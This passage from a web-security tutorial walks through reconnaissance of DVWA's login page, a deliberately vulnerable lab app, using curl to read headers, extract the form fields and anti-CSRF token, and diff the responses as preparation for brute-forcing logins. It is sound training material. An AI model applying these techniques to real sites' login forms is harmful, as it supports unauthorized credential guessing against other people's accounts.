&lt;/span&gt;&lt;span class="line"&gt;Set-Cookie: &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;t9eeaf7e8usuiu08jl9e092ro7&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/
&lt;/span&gt;&lt;span class="line"&gt;Expires: Thu, &lt;span class="m"&gt;19&lt;/span&gt; Nov &lt;span class="m"&gt;1981&lt;/span&gt; 08:52:00 GMT
&lt;/span&gt;&lt;span class="line"&gt;Cache-Control: no-store, no-cache, must-revalidate, post-check&lt;span class="o"&gt;=&lt;/span&gt;0, pre-check&lt;span class="o"&gt;=&lt;/span&gt;0
&lt;/span&gt;&lt;span class="line"&gt;Pragma: no-cache
&lt;/span&gt;&lt;span class="line"&gt;Set-Cookie: &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;t9eeaf7e8usuiu08jl9e092ro7&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/&lt;span class="p"&gt;;&lt;/span&gt; httponly
&lt;/span&gt;&lt;span class="line"&gt;Set-Cookie: &lt;span class="nv"&gt;security&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;impossible&lt;span class="p"&gt;;&lt;/span&gt; httponly
&lt;/span&gt;&lt;span class="line"&gt;Location: login.php
&lt;/span&gt;&lt;span class="line"&gt;Content-Length: 0
&lt;/span&gt;&lt;span class="line"&gt;Content-Type: text/html
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="DVVA Redirect" src="https://blog.g0tmi1k.com/images/dvwa-login-02.png" /&gt;&lt;/p&gt;

&lt;p&gt;The key bit of information here is &lt;code&gt;Location: login.php&lt;/code&gt;, as we can see that the request is being redirected. We can get cURL to automatically follow redirects by doing: &lt;code&gt;curl -L ...&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;On the subject of cURL and headers, here is a little "bash fu". By using:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;curl -i&lt;/code&gt; (or &lt;code&gt;curl --include&lt;/code&gt; for the long hand), it will &lt;strong&gt;include the header&lt;/strong&gt; response from a GET request in cURL's output.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;curl -I&lt;/code&gt; (or &lt;code&gt;curl --head&lt;/code&gt; for the long method), it will be a &lt;strong&gt;HEAD request&lt;/strong&gt; (not GET), to try and display &lt;strong&gt;only the headers&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;curl -D -&lt;/code&gt; (or &lt;code&gt;curl --dump-header -&lt;/code&gt; for the long way), it will be a GET request and will also &lt;strong&gt;include the header&lt;/strong&gt; response in the output.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;curl -v&lt;/code&gt; (or &lt;code&gt;curl --verbose&lt;/code&gt; for the long argument), it makes the output more detailed, and it will &lt;strong&gt;include both&lt;/strong&gt; the request &lt;strong&gt;and&lt;/strong&gt; response headers.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;em&gt;Note, a HEAD request is not the same as a GET request, therefore the web server may respond differently (which was the case with Apache setup).&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Login.Form..Rendered.Login.Prompt."&gt;&lt;/a&gt;
&lt;h3&gt;Login Form (Rendered Login Prompt)&lt;/h3&gt;

&lt;p&gt;As we now know where we need to start, it is time to see what we are going up against.&lt;/p&gt;

&lt;p&gt;At this stage we could use a GUI web browser (such as &lt;code&gt;Firefox&lt;/code&gt;/&lt;code&gt;Iceweasel&lt;/code&gt;), however, sticking with the command line, we can use &lt;code&gt;html2text&lt;/code&gt; to render the response (and then &lt;code&gt;uniq&lt;/code&gt; to shorten the output by removing duplicated empty lines).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s 192.168.1.33/DVWA/login.php | html2text | uniq&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;dvwa/images/login_logo.png&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt; Username &lt;span class="o"&gt;[&lt;/span&gt;username            &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Password &lt;span class="o"&gt;[&lt;/span&gt;********************&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;Login&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Damn_Vulnerable_Web_Application_&lt;span class="o"&gt;(&lt;/span&gt;DVWA&lt;span class="o"&gt;)&lt;/span&gt; is a RandomStorm OpenSource project.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Rendered Login Prompt" src="https://blog.g0tmi1k.com/images/dvwa-login-03.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Login.Form..HTML."&gt;&lt;/a&gt;
&lt;h3&gt;Login Form (HTML)&lt;/h3&gt;

&lt;p&gt;What would be useful, is to see how the page is made up by looking at the HTML code &lt;em&gt;(note, this is the code that is sent back to us - not what is stored on the target)&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;By using cURL and a little bit of "sed fu", we can select all the code between the &lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;/form&amp;gt;&lt;/code&gt; tags, which is what we are interested in, and remove any empty lines.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s 192.168.1.33/DVWA/login.php | sed -n '/&amp;lt;form/,/&amp;lt;\/form/p' | sed '/^[[:space:]]*$/d'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &amp;lt;form &lt;span class="nv"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;login.php&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;  &amp;lt;fieldset&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;          &amp;lt;label &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&amp;gt;Username&amp;lt;/label&amp;gt; &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;loginInput&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;          &amp;lt;label &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;pass&amp;quot;&lt;/span&gt;&amp;gt;Password&amp;lt;/label&amp;gt; &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;loginInput&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;AUTOCOMPLETE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;off&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;20&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;          &amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;          &amp;lt;p &lt;span class="nv"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;  &amp;lt;/fieldset&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;  &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'b03187270e23254dbac8611139dce829'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;  &amp;lt;/form&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="HTML" src="https://blog.g0tmi1k.com/images/dvwa-login-04.png" /&gt;&lt;/p&gt;

&lt;p&gt;This is the code which makes up the form. This will be useful later on as we now have the names of the fields to attack.&lt;/p&gt;

&lt;p&gt;We can also see a "hidden" field, &lt;code&gt;user_token&lt;/code&gt;. Based on the name and as the value appears to be a MD5 value (due to its length and character range), this signals it is an anti-CSRF (Cross-Site Request Forgery) token. If this is the case, it possibly could make the attack slightly more complex (by adding another stage when brute forcing, which will get a fresh token before each request).&lt;/p&gt;

&lt;p&gt;It does mean we will now &lt;strong&gt;HAVE to include a session ID&lt;/strong&gt; in the attack, which &lt;strong&gt;relates&lt;/strong&gt; to an anti-CSRF token.&lt;/p&gt;

&lt;p&gt;The session ID is stored somehow inside the user's browser (in this case using cookies). This is one of the ways which a web application can recognise each user who is using the site. This is often used with login systems, so rather than having to store and send the user credentials each time, the session value could be authenticated instead (this opens up other issues such as: anyone who knows the session value could be that user - session hijacking). In our case, the session ID is paired to the CSRF token. A valid session ID needs to be sent with the correct CSRF token. If either is incorrect and does not relate, the web application should protect itself.&lt;/p&gt;

&lt;p&gt;The session ID is static for the "session" (how long depends on both the PHP settings and web application) the user is on the site. However, the CSRF token will be unique to each page request (or at least in theory). This means someone cannot automate the request as the CSRF token should not be known beforehand, meaning the request could not be crafted to be automated (at least without chaining another vulnerability. &lt;a href="https://blog.g0tmi1k.com/atom.xml#*comingsoon*"&gt;&lt;del&gt;This is covered later&lt;/del&gt;&lt;/a&gt;). The PHP session is handled by PHP, whereas the CSRF token is handled by the web application.&lt;/p&gt;

&lt;p&gt;The PHP session can be kept "active", by making requests to the site using the session value in the request, and without the web application killing the session (e.g. logging out). Without the session value in the request, a new value will be assigned. Depending on the web application, it may see the two requests as two different users without a session ID (which is the case for us). This means if you were to use Iceweasel and Hydra from the same device (even sharing the same IP and user-agent) the web application  could believe its two different users. Also depending on the web application, you may be able to switch between session IDs as long as they are both still active &amp;amp; valid.&lt;/p&gt;

&lt;p&gt;CSRF tokens should not be re-used at any stage. If they have been, this means a URL can be able to be crafted ahead of time thus defeating the purpose of them, as a request could be automated.&lt;/p&gt;

&lt;p&gt;The web application itself needs to keep track of these two values (session id, &lt;code&gt;PHPSESSID&lt;/code&gt; and CSRF token, &lt;code&gt;user_token&lt;/code&gt;) and make sure they both are valid as well as matching correctly between requests.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Login.Form..Differentiating.Responses."&gt;&lt;/a&gt;
&lt;h3&gt;Login Form (Differentiating Responses)&lt;/h3&gt;

&lt;p&gt;Before we even try to login, we can capture the initial response as this does not include any attempt to login. This would make a useful "baseline" to compare the result of other responses.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -i 192.168.1.33/DVWA/login.php &amp;gt; /root/before.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;...Very boring as there are not any errors (lucky us!), and everything is being pipe'd (aka copied) into our baseline file &lt;code&gt;/root/before.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let's now make our first login attempt to the target. Of course, we have not got any credentials at this stage, and are just completely guessing the values. We will use &lt;code&gt;user&lt;/code&gt; for the username and &lt;code&gt;pass&lt;/code&gt; for the password (spoiler alert, both are incorrect), and a completely incorrect &lt;code&gt;user_token&lt;/code&gt; value.
Rather than viewing the response straight away, we can also pipe it into a file (&lt;code&gt;/root/after.txt&lt;/code&gt;) as this will make comparing responses much easier.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -i -L -d $'username=user&amp;amp;password=pass&amp;amp;user_token=123&amp;amp;Login=Login' 192.168.1.33/DVWA/login.php &amp;gt; /root/after.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;As you probably guessed, we are now going to compare the response between the two values (baseline &amp;amp; an incorrect login).&lt;/p&gt;

&lt;p&gt;We can use a GUI program (such as &lt;code&gt;Meld&lt;/code&gt;) to compare the text files, again, sticking with CLI. Note, &lt;code&gt;vimdiff&lt;/code&gt; could have been used; however, as vimdiff is interactive, it makes showing the output harder.&lt;/p&gt;

&lt;p&gt;By using &lt;code&gt;grc&lt;/code&gt; and a bash alias (&lt;code&gt;alias diff='/usr/bin/grc /usr/bin/diff'&lt;/code&gt;), the output can be made colourful, making it visually easier to read (see the screenshot images).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# diff /root/before.txt /root/after.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;0a1,14
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; HTTP/1.1 &lt;span class="m"&gt;302&lt;/span&gt; Found
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:57:35 GMT
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Server: Apache/2.4.10 &lt;span class="o"&gt;(&lt;/span&gt;Win32&lt;span class="o"&gt;)&lt;/span&gt; OpenSSL/1.0.1h PHP/5.4.31
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; X-Powered-By: PHP/5.4.31
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Set-Cookie: &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;cpkaaja7o9boomrl7fcj9lihg2&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Expires: Thu, &lt;span class="m"&gt;19&lt;/span&gt; Nov &lt;span class="m"&gt;1981&lt;/span&gt; 08:52:00 GMT
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Cache-Control: no-store, no-cache, must-revalidate, post-check&lt;span class="o"&gt;=&lt;/span&gt;0, pre-check&lt;span class="o"&gt;=&lt;/span&gt;0
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Pragma: no-cache
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Set-Cookie: &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;cpkaaja7o9boomrl7fcj9lihg2&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/&lt;span class="p"&gt;;&lt;/span&gt; httponly
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Set-Cookie: &lt;span class="nv"&gt;security&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;impossible&lt;span class="p"&gt;;&lt;/span&gt; httponly
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Location: login.php
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Content-Length: 119
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Content-Type: text/html
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;2c16
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:57:20 GMT
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 19:57:35 GMT
&lt;/span&gt;&lt;span class="line"&gt;5c19
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Set-Cookie: &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0pjgscf6jcektumgsegqk8gnf6&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Set-Cookie: &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;ltgtqqr1afn1q8obog71s1rk70&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/
&lt;/span&gt;&lt;span class="line"&gt;9c23
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt; Set-Cookie: &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0pjgscf6jcektumgsegqk8gnf6&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/&lt;span class="p"&gt;;&lt;/span&gt; httponly
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt; Set-Cookie: &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;ltgtqqr1afn1q8obog71s1rk70&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/&lt;span class="p"&gt;;&lt;/span&gt; httponly
&lt;/span&gt;&lt;span class="line"&gt;60c74
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;  &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'4bdcf7426fc9438c751ef8d3c7113f2e'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;  &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'2aec456b4e1614c2d350dcea06d2a446'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Baseline Responses" src="https://blog.g0tmi1k.com/images/dvwa-login-05.png" /&gt;&lt;/p&gt;

&lt;p&gt;Breaking down the difference, when we failed to login, we can see:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Being redirected again (same page: &lt;code&gt;Location: login.php&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PHPSESSID&lt;/code&gt; &amp;amp; &lt;code&gt;user_token&lt;/code&gt; is different.&lt;/li&gt;
&lt;li&gt;...time &amp;amp; date stamps are different (always will be the case).&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;All of this is to be expected (due to two unique &lt;code&gt;PHPSESSID&lt;/code&gt; values in the requests and neither of them relating to &lt;code&gt;user_token&lt;/code&gt;), so this is not shocking.&lt;/p&gt;

